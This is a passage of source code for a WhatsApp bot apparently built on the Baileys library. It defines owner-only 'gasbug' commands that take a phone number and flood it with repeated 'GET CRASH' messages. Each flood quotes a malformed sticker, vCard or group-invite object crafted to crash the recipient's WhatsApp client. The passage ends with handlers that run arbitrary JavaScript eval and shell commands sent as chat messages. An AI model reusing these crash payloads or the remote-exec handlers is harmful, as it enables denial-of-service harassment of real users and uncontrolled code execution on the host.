haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
await m.reply(`Succes`)
break
case 'gasbug10':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let stic1 = { 
"key": {
"participant": `6285814480623@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic1})
 await m.reply(`Succes`)
 break 
case 'gasbug11':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fkon1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:fkon1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:fkon1})
await m.reply(`Succes`)
break
case 'gasbug12':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let finv1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `© `, 
"caption": `© `, 
'jpegThumbnail': thumb
}
}
}
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:" GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv1})
await m.reply(`Succes`)
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return bangkal(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
bangkal(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await bangkal(evaled)
} catch (err) {
await bangkal(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return bangkal(err)
if (stdout) return bangkal(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})